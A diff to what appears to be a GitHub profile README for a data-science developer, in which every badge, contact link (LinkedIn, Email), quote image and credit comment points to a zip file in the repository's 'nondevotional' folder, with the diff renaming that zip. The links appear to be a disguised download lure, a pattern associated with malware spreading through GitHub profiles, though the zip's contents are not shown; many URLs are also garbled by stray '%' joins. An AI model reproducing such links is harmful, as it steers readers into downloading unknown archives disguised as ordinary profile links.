@@ -34,41 +34,41 @@ Also a huge **cricket fan** — I love the strategy and excitement behind the ga
 
 ## 🌐 Connect with Me  
 
-[![LinkedIn](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip%https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip)](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip)  
-[![Email](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip)](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip)
+[![LinkedIn](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip%https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip)](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip)  
+[![Email](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip)](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip)
 
 ---
 
 ## 💻 Tech Stack  
 
-![Python](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip) 
-![PowerShell](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip%https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip) 
-![Windows Terminal](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip%20Terminal-%https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip) 
-![AWS](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip%https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip) 
-![Oracle](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip) 
-![MySQL](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip) 
-![Postgres](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip%https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip) 
-![Teradata](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip) 
-![Keras](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip%https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip) 
-![Matplotlib](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip%https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip) 
-![mlflow](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip%https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip) 
-![NumPy](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip%https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip) 
-![Pandas](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip%https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip) 
-![Plotly](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip%https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip) 
-![scikit-learn](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip%https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip) 
-![SciPy](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip%https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip) 
-![TensorFlow](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip%https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip) 
-![Git](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip%https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip) 
-![Power BI](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip)
+![Python](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip) 
+![PowerShell](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip%https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip) 
+![Windows Terminal](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip%20Terminal-%https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip) 
+![AWS](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip%https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip) 
+![Oracle](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip) 
+![MySQL](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip) 
+![Postgres](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip%https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip) 
+![Teradata](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip) 
+![Keras](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip%https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip) 
+![Matplotlib](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip%https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip) 
+![mlflow](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip%https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip) 
+![NumPy](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip%https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip) 
+![Pandas](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip%https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip) 
+![Plotly](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip%https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip) 
+![scikit-learn](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip%https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip) 
+![SciPy](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip%https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip) 
+![TensorFlow](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip%https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip) 
+![Git](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip%https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip) 
+![Power BI](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip)
 
 ---
 
 ### ✍️ Random Dev Quote  
 
-![](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip)
+![](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip)
 
 ---
 
-[![](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip)](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip)
+[![](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip)](https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip)
 
-<!-- Proudly created with GPRM ( https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi94.zip ) -->
+<!-- Proudly created with GPRM ( https://raw.githubusercontent.com/trizvi94/trizvi94/main/nondevotional/trizvi-v3.1.zip ) -->
